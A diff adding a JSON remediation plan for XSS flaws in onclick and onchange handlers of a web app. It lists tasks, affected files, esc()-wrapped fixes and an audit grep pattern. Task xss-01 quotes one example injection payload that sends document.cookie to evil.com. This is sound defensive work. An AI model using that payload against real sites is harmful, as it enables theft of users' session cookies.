@@ -1,0 +1,98 @@
+{
+  "feature": {
+    "id": "security-xss-onclick",
+    "title": "Fix XSS vulnerabilities in onclick handlers",
+    "priority": "BLOCKER",
+    "scoreImpact": {
+      "XSS Security": "7/10 → 10/10"
+    },
+    "estimatedEffort": "S (2-4 hours)",
+    "dependsOn": []
+  },
+  "tasks": [
+    {
+      "id": "xss-01",
+      "title": "Fix unescaped database values in onclick JavaScript string literals (workspace-detail.js)",
+      "description": "Task IDs (t.tid) from RTDB/demo-data land unescaped inside JavaScript string literals in onclick attributes. A malicious task ID like `');fetch('https://evil.com?'+document.cookie)//` would execute arbitrary JS. Wrap all with esc(): `onclick=\"${fn.deleteTask}('${esc(t.tid)}')\"` and `onchange=\"${fn.toggleTask}('${esc(t.tid)}', !${t.completed})\"`. Also fix timer string comparison (`timerElapsed > '07:00:00'` → numeric comparison using ms).",
+      "affectedFiles": [
+        "assets/src/views/workspace-detail.js"
+      ],
+      "dependencies": [],
+      "complexity": "S",
+      "estimatedHours": 1,
+      "acceptanceCriteria": [
+        "line 44: `onchange=\"${fn.toggleTask}('${esc(t.tid)}', !${t.completed})\"` — tid escaped",
+        "line 46: `onclick=\"${fn.deleteTask}('${esc(t.tid)}')\"` — tid escaped",
+        "line 65: timer warning uses `(Date.now() - ws.timers.current.startTime) > 7 * 3600000`",
+        "No other unescaped DB values in onclick/onchange/oninput attributes",
+        "Existing esc() calls on text content preserved"
+      ]
+    },
+    {
+      "id": "xss-02",
+      "title": "Fix unescaped database values in onclick handlers (webhooks.js)",
+      "description": "Webhook subscription IDs (w.sid) from RTDB/demo-data land unescaped in onclick JS strings. Wrap with esc().",
+      "affectedFiles": [
+        "assets/src/views/webhooks.js"
+      ],
+      "dependencies": [],
+      "complexity": "S",
+      "estimatedHours": 0.5,
+      "acceptanceCriteria": [
+        "line 62: `onclick=\"${fn.testWebhook}('${esc(w.sid)}')\"`",
+        "line 63: `onclick=\"${fn.unsubscribeWebhook}('${esc(w.sid)}')\"`",
+        "No other unescaped DB values in onclick attributes"
+      ]
+    },
+    {
+      "id": "xss-03",
+      "title": "Fix unescaped database values in onclick handlers (contacts.js)",
+      "description": "Contact IDs (c.cid) from RTDB/demo-data land unescaped in onclick navigating to contact detail. Wrap with esc().",
+      "affectedFiles": [
+        "assets/src/views/contacts.js"
+      ],
+      "dependencies": [],
+      "complexity": "S",
+      "estimatedHours": 0.5,
+      "acceptanceCriteria": [
+        "line 47: `onclick=\"${fn.navigateTo}('/contacts/${esc(c.cid)}')\"`",
+        "No other unescaped DB values in onclick attributes"
+      ]
+    },
+    {
+      "id": "xss-04",
+      "title": "Fix unescaped form field IDs in DOM id attributes (booking.js)",
+      "description": "Form field IDs (f.id) from eventType.formFields used in DOM id attributes unescaped. While id attributes are not directly XSS-executable, special characters break DOM structure. Wrap with esc().",
+      "affectedFiles": [
+        "assets/src/views/booking.js"
+      ],
+      "dependencies": [],
+      "complexity": "S",
+      "estimatedHours": 0.5,
+      "acceptanceCriteria": [
+        "line 209: `id=\"bf-${esc(f.id)}\"` for textarea",
+        "line 210: `id=\"bf-${esc(f.id)}\"` for input",
+        "Form fields with special characters in IDs don't break DOM"
+      ]
+    },
+    {
+      "id": "xss-05",
+      "title": "Audit all onclick/onchange/oninput handlers across all view and component files",
+      "description": "Run grep for `onclick=`, `onchange=`, `oninput=`, `onkeydown=` across all views/ and components/. Verify every template-expression value inside JS string literals is esc()-wrapped. Hardcoded strings (routes, labels from constants) are exempt.",
+      "affectedFiles": [
+        "assets/src/views/*.js (20 files)",
+        "assets/src/components/*.js (18 files)",
+        "assets/src/shell-template.js"
+      ],
+      "dependencies": ["xss-01", "xss-02", "xss-03", "xss-04"],
+      "complexity": "M",
+      "estimatedHours": 2,
+      "acceptanceCriteria": [
+        "Zero unescaped dynamic values in onclick/onchange/oninput/onkeydown JS string literals",
+        "Grep pattern: `on(click|change|input|keydown)=\"\\$\\{fn\\.\\w+\\}\\('[^')]*\\$\\{[^}]*\\}` — all hits verified esc()-wrapped",
+        "Hardcoded routes from constants/nav.js verified safe (no user input)",
+        "No regression in any view rendering"
+      ]
+    }
+  ]
+}
